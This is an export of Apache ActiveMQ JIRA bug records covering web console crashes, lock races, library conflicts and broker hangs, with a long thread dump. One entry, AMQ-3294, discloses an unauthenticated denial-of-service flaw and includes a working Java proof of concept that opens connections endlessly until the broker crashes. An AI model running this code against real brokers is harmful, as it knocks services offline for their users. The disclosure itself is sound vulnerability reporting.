Standalone Webconsole crashes when accessing master-slave failover activeMQ,AMQ-3303,12506378,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,abrand@esca.fr,abrand@esca.fr,06/May/11 07:46,17/Oct/13 13:28,14/Jul/23 05:43,17/Oct/13 13:28,5.5.0,,,,,5.9.0,,,JMX,,,,1,,,,,,,,,"Null pointer exception when accessing the JSPs if the first jmx server (here activemq-1) in the jmx url is the slave.
findBrokers in RemoteJMXBrokerFacade finds the slave broker but accessing some of its attributes results in a NullPointerException.","Webconsole running on tomcat 6 on ubuntu 10.04LTS with sun jdk. 
Options : webconsole.type=properties, webconsole.jms.url=failover:(tcp://activemq-1:61616,tcp://activemq-2:61616), webconsole.jms.user=xxxxxxxxxx, webconsole.jms.password=xxxxxxxxx, webconsole.jmx.url=service:jmx:rmi:///jndi/rmi://activemq-1:11099/jmxrmi,service:jmx:rmi:///jndi/rmi://activemq-2:11099/jmxrmi, webconsole.jmx.user=xxxxxxxxxxx, webconsole.jmx.password=xxxxxxxxxxxxxxxx",gtully,jgoodyear,sbrandt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/May/11 07:49;abrand@esca.fr;RemoteJMXBrokerFacade.patch;https://issues.apache.org/jira/secure/attachment/12478386/RemoteJMXBrokerFacade.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74701,,,Thu Oct 17 13:28:55 UTC 2013,,,,,,,Patch Available,,,,"0|i0eb2v:",81557,,,,,,,,,,,,,,,,,,,,,"06/May/11 07:49;abrand@esca.fr;This patch modifies findBrokers to only return brokers that are not slaves.

I don't know wether this is the ideal way of fixing the problem (in case the RemoteJMXBrokerFacade is used elsewhere), but at least it fixes the webconsole.;;;","02/Jul/13 21:49;jgoodyear;This patch unfortunately can not work against AMQ 5.8.0 as the signature of BrokerViewMBean.java has changed to not include isSlave() method.;;;","02/Jul/13 21:51;jgoodyear;Note: https://issues.apache.org/jira/browse/AMQ-4330 -- this API call is coming back into AMQ;;;","02/Jul/13 22:47;jgoodyear;Manual testing scenario:

On unpatched 5.9 kit:
Start master and slave with external webconsole.
Stop and quickly restart active master broker. You will observe the JMS service fails over as expected, however the webconsole will still be attached to the old master.

On patched 5.9 kit:
Start master and slave with external webconsole.
Stop and quickly restart active master broker. You will observe the JMS service fails over as expected, and the web console correctly switches to the new active broker.
;;;","17/Oct/13 13:28;gtully;unit test that validates the fix in https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=f5dd1256;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broken link (current apidocs),AMQ-3302,12505925,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,dewarim,dewarim,02/May/11 12:58,20/Jul/11 13:17,14/Jul/23 05:43,20/Jul/11 13:17,,,,,,,,,Documentation,,,,0,,,,,,,,,"http://camel.apache.org/maven/current/camel-activemq/apidocs/org/apache/camel/component/activemq/ActiveMQComponent.html#activeMQComponent(java.lang.String)

gives a 404,

link is on: http://camel.apache.org/activemq.html",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,67383,,,Wed Jul 20 13:17:54 UTC 2011,,,,,,,,,,,"0|i0s2b3:",161850,,,,,,,,,,,,,,,,,,,,,"20/Jul/11 13:17;tabish;Fixed link to point to current API docs.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LockFile in-jvm check is not thread-safe,AMQ-3301,12505811,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,rajdavies,artnaseef,artnaseef,29/Apr/11 17:45,15/Apr/12 04:51,14/Jul/23 05:43,15/Apr/12 04:51,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"kahadb/src/main/java/org/apache/kahadb/util/LockFile.java adds in-JVM locking to Channel.tryLock() using system properties.  However, there is time between the read-and-check for an existing lock and setting a new lock.

I found this problem while running multiple brokers in a single JVM for diagnostic purposes with two brokers using a shared directory to simlute a production H/A environment.",,artnaseef,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Apr/11 17:47;artnaseef;amq-3301.patch;https://issues.apache.org/jira/secure/attachment/12477820/amq-3301.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74702,,,Sun Apr 15 04:51:39 UTC 2012,,,,,,,Patch Available,,,,"0|i0ajg7:",59424,,,,,,,,,,,,,,,,,,,,,"29/Apr/11 17:47;artnaseef;Patch which eliminates the race condition on the in-JVM lock test.;;;","15/Apr/12 04:51;rajdavies;Patch applied in SVN revision 1326252;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove (old version) slf4j-api lib from amq releases,AMQ-3296,12505152,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,hanson2010,hanson2010,26/Apr/11 04:30,23/Jan/12 17:58,14/Jul/23 05:43,20/Aug/11 21:37,5.5.0,,,,,5.6.0,,,Broker,,,,1,,,,,,,,,"The conflict versions of slf4j will cause problem if you have your own slf4j libs included in the project.

In my case, slf4j-api-1.6.1.jar and slf4j-log4j12-1.6.1.jar are on classpath.

SLF4J: The requested version 1.6 by your slf4j binding is not compatible with [1.5.5, 1.5.6, 1.5.7, 1.5.8, 1.5.9, 1.5.10, 1.5.11]
SLF4J: See http://www.slf4j.org/codes.html#version_mismatch for further details.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60066,,,Wed Nov 02 18:19:37 UTC 2011,,,,,,,,,,,"0|i0ajh3:",59428,,,,,,,,,,,,,,,,,,,,,"20/Aug/11 21:37;tabish;Fixed in trunk.  Latest releases of pax logging support slf4j 1.6.1 according to the release notes.  ;;;","02/Nov/11 18:19;johno;Does this include the bundled sl4j in activemq-all?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ failover Denial of Service,AMQ-3294,12505000,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,luca.carettoni,luca.carettoni,22/Apr/11 18:44,02/Dec/11 21:37,14/Jul/23 05:43,02/Dec/11 21:37,5.2.0,5.5.0,,,,5.6.0,,,Broker,,,,0,security,,,,,,,,"Abusing the 'failover' feature in ActiveMQ, an unauthenticated user can trigger a Denial of Service condition against the broker service. 

In detail, an attacker can issue multiple ActiveMQ openwire connection requests using the following connection string:  failover:tcp://<IP>:61616

Due to the 'failure' mechanism, all TCP connections remain active even if a valid session is not created. 
Please note that no valid credentials have been used. 

After a few thousand requests, a ""java.net.SocketException: Too many open files"" exception is triggered causing the freeze/crash of the broker. Connected systems may crash as well. 

During my test, the attack took around 4 minutes (in a local network) and it is highly reliable. This is most likely an abuse of the 'failover' functionality.

I've been testing version 5.2.0 and also the latest 5.5.0 release. As both releases are affected, I assume that this issue is present in other versions as well. The problem appears in the default configuration as well as with different authentication plugins enabled.

Proof-Of-Concept:

--------------------
package openwireclient;

import javax.jms.*;
import org.apache.activemq.ActiveMQConnectionFactory;

public class GoAndCrash {

    private static String url = ""failover:tcp://"";

    public static void main(String[] args) throws JMSException {

        System.out.println(""\n--[ ActiveMQ Denial of Service PoC ]\n"");

        url = url.concat(args[0] + "":"" + args[1]);
        int cont = 0;

        while (true) {
            try {
                System.out.println(""[*] Request #"" + cont);
                ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(""invalidUser"", ""invalidPass"", url);
                Connection connection = connectionFactory.createConnection();
                cont++;
                connection.start();
            } catch (Exception ex) {
               //do nothing
            }
        }
    }
}
--------------------
","Linux ubuntu 2.6.32-30-generic and other Linux versions
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,63008,,,Fri Dec 02 21:37:37 UTC 2011,,,,,,,,,,,"0|i0ajhb:",59429,,,,,,,,,,,,,,,,,,,,,"30/Aug/11 16:40;luca.carettoni;After a few months, any update on this?

Thanks,
Luca;;;","31/Aug/11 16:49;gtully;https://issues.apache.org/jira/browse/AMQ-1928 helps here, it allows you to limit the number of concurrent connections. Set this to 10 and the DoS attack will fail;;;","31/Aug/11 17:47;luca.carettoni;Gary, thanks for your follow-up!
Haven't tested it yet but it looks indeed as a possible workaround - at least to avoid a brutal crash.

I've just downloaded the latest stable (5.5.0) and it does not include this configuration option in any of the configuration templates. From the security standpoint, it will be great to see this transport option enabled by default with a reasonable value.;;;","02/Dec/11 21:37;rajdavies;Fixed by revision 1209700;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"ActiveMQ broker hangs after sending many large messages with a TTL, and no DLQ",AMQ-3293,12504987,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,scotte,scotte,22/Apr/11 16:39,02/May/13 02:29,14/Jul/23 05:43,30/Nov/11 17:01,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"While doing some ActiveMQ configuration testing I've run into some interesting where I can consistently make ActiveMQ 5.4.2 hang, unable even to shutdown. In this particular case, I have a producer that repeatedly sends persistent TextMessages containing random contents, of a random length up to 4MB to a single queue, with a 30 second TTL. You'll see in the configuration fragments below that we have sendFailIfNoSpace=true and are using vmQueueCursor with a DLQ policy of processExpired=false.

At some point, the client will get a ResourceAllocationException, as expected once we hit the store limits. I'm running this client in a loop where it will keep trying, and as messages get expired, it will eventually start sending messages again. This will run for awhile, but then the producer will eventually hang. If I kill and restart the producer, it will continue to hang. The jetty console may show a couple of pending messages in the queue, but any consumer also hangs.

Attempting to shut down activemq results in an error message that a particular connection ""is taking a long time to shutdown"", however there are no connections to the indicated port (as that producer was killed).

You can see full thread dumps, lsof output, etc below.

In another testcase, I was not using vmQueueCursor but this results in OutOfMemory exceptions repeatedly in ActiveMQ, and attempts to restart ActiveMQ hang right after kahadb journal recovery. I do not have a stacktrace or more info from this particular testcase.

I can sanitize the producer client testcase if needed and attach it.

----------

Full thread dump Java HotSpot(TM) Server VM (1.5.0_22-b03 mixed mode):

""Simple Discovery Agent: java.util.concurrent.ThreadPoolExecutor$Worker@520fa4"" daemon prio=1 tid=0x0a079150 nid=0x16c6 in Object.wait() [0x88d73000..0x88d74100]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90bc0818> (a java.lang.Object)
        at org.apache.activemq.transport.discovery.simple.SimpleDiscoveryAgent$1.run(SimpleDiscoveryAgent.java:136)
        - locked <0x90bc0818> (a java.lang.Object)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:651)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:676)
        at java.lang.Thread.run(Thread.java:595)

""NetworkBridge"" daemon prio=1 tid=0x0a0819d8 nid=0x16c5 waiting on condition [0x883e0000..0x883e0d80]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireNanos(AbstractQueuedSynchronizer.java:807)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireNanos(AbstractQueuedSynchronizer.java:1122)
        at java.util.concurrent.SynchronousQueue$Node.waitForPut(SynchronousQueue.java:291)
        at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:443)
        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:475)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)
        at java.lang.Thread.run(Thread.java:595)

""ActiveMQ Task"" daemon prio=1 tid=0x0a337a10 nid=0x16be waiting on condition [0x87cfc000..0x87cfd100]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:716)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:746)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1076)
        at java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync.wlock(ReentrantReadWriteLock.java:342)
        at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:637)
        at org.apache.activemq.broker.TransportConnection$3.run(TransportConnection.java:939)
        at java.lang.Thread.run(Thread.java:595)

""Simple Discovery Agent: java.util.concurrent.ThreadPoolExecutor$Worker@1ab90e2"" daemon prio=1 tid=0x0a875038 nid=0x1621 in Object.wait() [0x891fc000..0x891fcf80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90bc0818> (a java.lang.Object)
        at org.apache.activemq.transport.discovery.simple.SimpleDiscoveryAgent$1.run(SimpleDiscoveryAgent.java:136)
        - locked <0x90bc0818> (a java.lang.Object)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:651)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:676)
        at java.lang.Thread.run(Thread.java:595)

""ActiveMQ Task"" daemon prio=1 tid=0x09ba8158 nid=0x15ee waiting on condition [0x88059000..0x88059f80]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:716)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:746)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1076)
        at java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync.wlock(ReentrantReadWriteLock.java:342)
        at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:637)
        at org.apache.activemq.broker.TransportConnection$3.run(TransportConnection.java:939)
        at java.lang.Thread.run(Thread.java:595)

""Simple Discovery Agent: java.util.concurrent.ThreadPoolExecutor$Worker@12b6836"" daemon prio=1 tid=0x09c814a8 nid=0x15e0 waiting on condition [0x87c7b000..0x87c7bd80]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireNanos(AbstractQueuedSynchronizer.java:807)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireNanos(AbstractQueuedSynchronizer.java:1122)
        at java.util.concurrent.SynchronousQueue$Node.waitForPut(SynchronousQueue.java:291)
        at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:443)
        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:475)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)
        at java.lang.Thread.run(Thread.java:595)

""ConcurrentQueueStoreAndDispatch"" daemon prio=1 tid=0x09ef2628 nid=0x157f waiting on condition [0x88ff8000..0x88ff8e00]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1841)
        at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:359)
        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)
        at java.lang.Thread.run(Thread.java:595)

""ActiveMQ Transport: tcp:///10.4.64.66:34904"" daemon prio=1 tid=0x09ba7ee8 nid=0x1579 waiting on condition [0x88563000..0x88563e80]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:716)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:746)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1076)
        at java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync.wlock(ReentrantReadWriteLock.java:342)
        at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:637)
        at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1599)
        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:708)
        at org.apache.activemq.broker.region.Queue.send(Queue.java:644)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:518)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:227)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:192)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:462)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:677)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228)
        - locked <0xa08ab6d8> (a org.apache.activemq.transport.InactivityMonitor$1)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
        at java.lang.Thread.run(Thread.java:595)

""ActiveMQ Connection Dispatcher: /10.4.64.66:34904"" daemon prio=1 tid=0x0a1a44d8 nid=0x1578 in Object.wait() [0x8b0fe000..0x8b0fef00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0xa08edc38> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0xa08edc38> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""ActiveMQ Connection Dispatcher: vm://cluster_a#6012"" daemon prio=1 tid=0x09fca838 nid=0x2c54 in Object.wait() [0x87fd8000..0x87fd9000]
        at java.lang.Object.wait(Native Method)
        - waiting on <0xa07b6438> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0xa07b6438> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""ActiveMQ Connection Dispatcher: vm://cluster_a#3116"" daemon prio=1 tid=0x0a7aeb38 nid=0x6139 in Object.wait() [0x87dfe000..0x87dfef80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0xa0791430> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0xa0791430> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""ActiveMQ Transport: tcp:///10.4.64.66:36292"" daemon prio=1 tid=0x0a1a4ba0 nid=0x1b15 waiting on condition [0x890fa000..0x890fb080]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:716)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:872)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1179)
        at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:201)
        at java.util.concurrent.FutureTask.get(FutureTask.java:80)
        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:718)
        at org.apache.activemq.broker.region.Queue.send(Queue.java:644)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:518)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:227)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:192)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:462)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:677)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228)
        - locked <0xa0013660> (a org.apache.activemq.transport.InactivityMonitor$1)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
        at java.lang.Thread.run(Thread.java:595)

""ActiveMQ Connection Dispatcher: /10.4.64.66:36292"" daemon prio=1 tid=0x09caed28 nid=0x1b14 in Object.wait() [0x882de000..0x882df100]
        at java.lang.Object.wait(Native Method)
        - waiting on <0xa00133c8> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0xa00133c8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Topic  ActiveMQ.Advisory.Consumer.Queue.orchestrationResponse"" daemon prio=1 tid=0x09e83730 nid=0xbad in Object.wait() [0x87d7d000..0x87d7e000]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x9167a250> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x9167a250> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Topic  ActiveMQ.Advisory.Expired.Queue.orchestrationResponse"" daemon prio=1 tid=0x09e846b0 nid=0x17b in Object.wait() [0x884e2000..0x884e2d80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x916643d8> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x916643d8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Topic  ActiveMQ.Advisory.MessageDLQd.Queue.orchestrationResponse"" daemon prio=1 tid=0x0a028150 nid=0x17a in Object.wait() [0x8835f000..0x8835fe00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x91662a10> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x91662a10> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Usage Async Task"" daemon prio=1 tid=0x0a0c7e30 nid=0x7fdb waiting on condition [0x880da000..0x880dae80]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1841)
        at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:359)
        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)
        at java.lang.Thread.run(Thread.java:595)

""Topic  ActiveMQ.Advisory.Producer.Queue.orchestrationResponse"" daemon prio=1 tid=0x0a10d120 nid=0x7fd7 in Object.wait() [0x8815b000..0x8815bf00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90cc6118> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x90cc6118> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Topic  ActiveMQ.Advisory.Queue"" daemon prio=1 tid=0x0a844bb8 nid=0x7fd6 in Object.wait() [0x881dc000..0x881dcf80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90cc2f48> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x90cc2f48> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Queue:orchestrationResponse"" daemon prio=1 tid=0x89680bc8 nid=0x7fd5 waiting on condition [0x8825d000..0x8825e000]
        at sun.misc.Unsafe.park(Native Method)
